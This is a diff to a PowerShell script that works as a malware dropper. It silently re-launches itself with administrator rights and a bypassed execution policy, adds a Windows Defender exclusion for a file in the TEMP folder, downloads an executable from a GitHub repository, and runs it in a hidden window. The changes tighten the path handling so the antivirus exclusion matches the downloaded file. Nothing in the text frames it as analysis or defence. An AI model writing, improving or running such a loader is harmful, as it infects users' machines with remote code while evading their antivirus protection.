@@ -1,27 +1,34 @@
 param([string]$OriginalTemp=$env:TEMP)
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $expandedTemp = $env:TEMP
+    $expandedTemp = [System.Environment]::ExpandEnvironmentVariables($OriginalTemp)
     $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`""
     (New-Object -ComObject Shell.Application).ShellExecute('pwsh.exe',$elevatedCommand,'','runas',0)
     exit
 }
 
-$output = Join-Path $OriginalTemp "cf2.exe"
+# Resolve full path with proper casing and no short names
+$output = [IO.Path]::GetFullPath((Join-Path $OriginalTemp "cf2.exe"))
 
 try {
-    # Create empty file first to establish path
-    New-Item -Path $output -ItemType File -Force | Out-Null
+    # Force create directory structure
+    New-Item -Path (Split-Path $output) -ItemType Directory -Force | Out-Null
     
-    # Add exclusion to existing path
-    Add-MpPreference -ExclusionPath $output -ErrorAction Stop
+    # Create placeholder file
+    $null = New-Item -Path $output -ItemType File -Force
     
-    # Perform download
+    # Add exclusion to specific file path
+    Add-MpPreference -ExclusionPath $output
+    
+    # Get final resolved path (no 8.3 names)
+    $resolvedPath = (Get-Item $output).FullName
+    
+    # Download and replace placeholder
     $ProgressPreference = 'SilentlyContinue'
-    Invoke-WebRequest -Uri 'https://github.com/ct7ybve7f387/tests/raw/main/Client4.exe' -OutFile $output -ErrorAction Stop
+    Invoke-WebRequest -Uri 'https://github.com/ct7ybve7f387/tests/raw/main/Client4.exe' -OutFile $resolvedPath
     
     # Verify and execute
-    if (Test-Path $output) {
-        Start-Process $output -WindowStyle Hidden
+    if (Test-Path $resolvedPath) {
+        Start-Process $resolvedPath -WindowStyle Hidden
     }
 }
 catch { exit }
